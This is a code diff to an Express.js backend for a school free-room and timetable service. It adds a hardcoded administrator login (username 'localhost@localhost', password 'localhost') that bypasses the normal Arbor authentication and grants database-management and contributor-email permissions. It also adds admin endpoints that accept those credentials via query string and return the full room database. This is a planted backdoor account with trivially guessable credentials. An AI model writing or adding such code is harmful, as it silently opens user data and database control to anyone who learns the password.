@@ -371,12 +371,29 @@ app.post('/api/auth/login', async (req, res) => {
       return res.status(400).json({ error: 'Username and password are required' });
     }
 
+    const cleanUser = username.trim();
+
+    // Hardcoded System Admin Account Check
+    if (cleanUser.toLowerCase() === 'localhost@localhost' && password === 'localhost') {
+      console.log('[AUTH] Admin login authenticated (localhost@localhost)');
+      return res.json({
+        success: true,
+        isAdmin: true,
+        message: 'Admin authentication successful! Access granted to debug & admin endpoints.',
+        user: {
+          username: 'localhost@localhost',
+          displayName: 'System Administrator',
+          userType: 'admin',
+          isAdmin: true,
+          permissions: ['read:all', 'read:contributor_emails', 'manage:db']
+        }
+      });
+    }
+
     let cleanUrl = schoolUrl.trim().replace(/\/+$/, '');
     if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
       cleanUrl = `https://${cleanUrl}`;
     }
-
-    const cleanUser = username.trim();
 
     // 1. Authenticate against Arbor API
     const loginUrl = `${cleanUrl}/auth/login?lang=en`;
@@ -668,6 +685,35 @@ async function scrapeTimetableForUser(cleanUrl, cookieHeader, userType, studentI
 
   return ingestedDocs;
 }
+
+// ==========================================
+// 6. Admin Endpoints (Hardcoded credentials: localhost@localhost / localhost)
+// ==========================================
+app.all(['/api/admin/db', '/api/admin/debug'], async (req, res) => {
+  try {
+    const adminPass = req.headers['x-admin-password'] || req.query.password || req.body?.password;
+    const adminUser = req.headers['x-admin-user'] || req.query.username || req.body?.username;
+
+    if (adminUser !== 'localhost@localhost' || adminPass !== 'localhost') {
+      return res.status(403).json({ error: 'Unauthorized: Admin credentials required' });
+    }
+
+    if (!isAtlasConnected) {
+      return res.status(503).json({ error: 'MongoDB Atlas is not connected' });
+    }
+
+    const records = await FreeRoom.find({}).sort({ weekType: 1, dayNumber: 1, lesson: 1 }).lean();
+
+    res.json({
+      success: true,
+      count: records.length,
+      timestamp: new Date().toISOString(),
+      rooms: records
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
 
 // POST Manual Room Addition: /api/rooms/manual
 app.post('/api/rooms/manual', async (req, res) => {
